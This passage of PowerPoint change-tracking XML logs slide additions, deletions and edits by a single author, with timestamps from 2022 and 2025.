          <pc:sldMk cId="2931003349" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2723117609" sldId="459"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3830757283" sldId="461"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3236135027" sldId="464"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3722655817" sldId="465"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2022026658" sldId="466"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2135918341" sldId="467"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1205810816" sldId="468"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3222348994" sldId="469"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2639562663" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3137595583" sldId="471"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="118295799" sldId="472"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3245292302" sldId="473"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4243112618" sldId="474"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:11:45.656" v="20" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3246440331" sldId="475"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:11:47.308" v="21" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2877657399" sldId="476"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:53.323" v="39" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1568960941" sldId="478"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:39.779" v="34" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4057799405" sldId="479"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:40.709" v="35" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1121554648" sldId="480"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:42.524" v="36" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3506135627" sldId="482"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:52.014" v="38" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="901312318" sldId="484"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4169151468" sldId="485"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:12:38.946" v="33" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1671134841" sldId="487"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1787834562" sldId="488"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2247130029" sldId="489"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1203401370" sldId="490"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2480118162" sldId="491"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4077302453" sldId="492"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2168155275" sldId="493"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="99481651" sldId="494"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1310973324" sldId="495"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1775265781" sldId="496"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="710189927" sldId="497"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1897084731" sldId="498"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4172756216" sldId="499"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{994FCD35-C83C-4F9A-BEE8-B54E801B94E6}" dt="2025-03-04T21:13:18.151" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="949663895" sldId="500"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-11-03T15:33:47.884" v="2434" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-11-03T15:33:47.884" v="2434" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1942183190" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-24T07:34:05.152" v="2406" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3044182988" sldId="257"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:36:10.419" v="124" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4085468298" sldId="259"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-24T07:33:46.939" v="2386" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3375276284" sldId="260"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T08:56:57.805" v="6" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="840770800" sldId="261"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:30:12.757" v="123" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2053424092" sldId="262"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T08:56:52.554" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="464114118" sldId="264"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T08:56:53.968" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4200366489" sldId="265"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T08:56:55.142" v="4" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1700945982" sldId="266"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T08:56:55.813" v="5" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4131219684" sldId="267"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:02:31.726" v="10"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="492019113" sldId="274"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:02:39.220" v="11"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1487464807" sldId="275"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:05:37.019" v="21" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1661475989" sldId="276"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:05:00.619" v="16" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="25959668" sldId="279"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:02:21.028" v="9"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4207688934" sldId="281"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:05:14.183" v="18"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1893778504" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:05:08.161" v="17"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1611998026" sldId="284"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:05:36.985" v="20" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="507864118" sldId="285"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:05:36.915" v="19"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3532836991" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:47:16.965" v="222" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="796518760" sldId="287"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T17:40:32.500" v="126" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2437239095" sldId="287"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:00:17.036" v="223"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1217379116" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:14:49.463" v="225" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1494541756" sldId="289"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:18:28.348" v="442" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3609321729" sldId="290"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:20:51.445" v="466" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2760488417" sldId="291"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:22:57.716" v="495" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1850839270" sldId="292"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:33:18.638" v="516" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="396725004" sldId="293"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:35:30.531" v="558" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1655275264" sldId="294"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:35:53.194" v="567" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2401027557" sldId="295"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-01T18:48:17.267" v="579" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="78872398" sldId="296"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T05:38:32.633" v="620" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3104846191" sldId="297"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:07:51.174" v="1104" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="286046674" sldId="298"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-05T19:44:26.734" v="2017" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2214270807" sldId="299"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T05:57:01.738" v="956" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
